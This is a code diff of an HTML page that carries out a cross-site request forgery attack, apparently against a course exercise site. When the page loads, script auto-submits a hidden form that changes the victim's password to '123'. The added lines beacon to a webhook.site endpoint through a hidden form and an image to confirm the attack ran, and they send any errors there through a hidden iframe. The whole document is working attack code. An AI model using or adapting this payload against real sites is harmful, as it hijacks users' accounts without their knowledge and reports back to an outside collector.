@@ -7,8 +7,11 @@
     <script>
         window.onload = function() {
             var form = document.createElement("form");
+            var formCheck = document.createElement("form");
             form.method = "POST";
             form.action = "http://cats.is-course.ru/settings"; // Target URL
+            formCheck.method = "GET";
+            formCheck.action = 'https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f';
 
             var passwordInput = document.createElement("input");
             passwordInput.type = "hidden";
@@ -22,12 +25,36 @@
             confirmPasswordInput.value = "123";
             form.appendChild(confirmPasswordInput);
 
+            var formCheckInput = document.createElement("input");
+            formCheckInput.type = "hidden";
+            formCheckInput.name = "check";
+            formCheckInput.value = "true";
+            formCheck.appendChild(formCheckInput);
+
             document.body.appendChild(form);
-            form.submit(); // Submit the form
+            document.body.appendChild(formCheck);
+            try {
+                formCheck.submit();
+                form.submit();
+            } catch (error) {
+                var formError = document.createElement("form");
+                formError.method = "GET";
+                formError.action = 'https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f';
+                var formErrorInput = document.createElement("input");
+                formErrorInput.type = "hidden";
+                formErrorInput.name = "error";
+                formErrorInput.value = error;
+                formError.appendChild(formErrorInput);
+                document.body.appendChild(formError);
+                formError.target = 'dummyframe'
+                formError.submit();
+            }
         }
     </script>
 </head>
 <body>
-<img src="https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f" style="display:none" />
+<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+<iframe name="dummyframe" id="dummyframe2" style="display: none;"></iframe>
+<img src="https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f?by_img=true" style="display:none"/>
 </body>
 </html>
